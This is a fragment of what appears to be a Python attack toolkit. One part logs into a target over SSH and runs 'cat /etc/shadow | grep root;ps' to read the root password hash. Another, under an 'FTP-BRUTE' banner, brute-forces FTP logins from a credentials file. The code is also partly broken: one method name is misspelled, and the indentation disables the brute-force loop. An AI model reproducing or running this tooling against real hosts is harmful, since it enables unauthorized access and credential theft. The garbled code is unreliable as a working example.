                    ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
                    if ret == 0:
                        print('[-] Error Connecting')
                        return
                spawn.sendline(password)
                spawn.expect(PROMPT)
                return spawn

            def main():
                host = input("Enter Host to Target: ")
                user = input("Enter SSH Username: ")
                password = input("Enter SSH Password: ")
                shell = connect(user, host, password)
                send_command(shell, 'cat /etc/shadow | grep root;ps')

            main()


        elif WH7 == "03" :

            print("""
            _______ _______  _____      ______   ______ _     _ _______ _______
            |______    |    |_____] ___ |_____] |_____/ |     |    |    |______
            |          |    |           |_____] |    \_ |_____|    |    |______
                """)
            
            def bruteLogin(hostname, passwordFile):
                try:
                    file = open(passwordFile, 'r')
                except:
                    print('[-] File Does Not Exist')
   
                    print('[*] Attempting to Login to: ' + hostname + '\n') 
                    for line in file.readlines():
                        username = line.split(':')[0].strip('\n')
                        password = line.split(':')[1].strip('\n')
                        print('[*] Trying Credentials: ' + username + ' : ' + password)
                        try:
                            ftp = ftplib.FTP(hostname)
                            login = ftp.login(username, password)
                            print('[+] Login Successful With: ' + username + ' / ' + password)
                            ftp.quit()
                            return(username, password)
                        except:
                            pass
                print('[-] Password Not In List')

            host = input("[*] Enter Host to Target: ")
            passwordFile = input('[*] Enter User/Password File Path: ')
            bruteLogin(host, passwordFile)
    brute_module()
    
          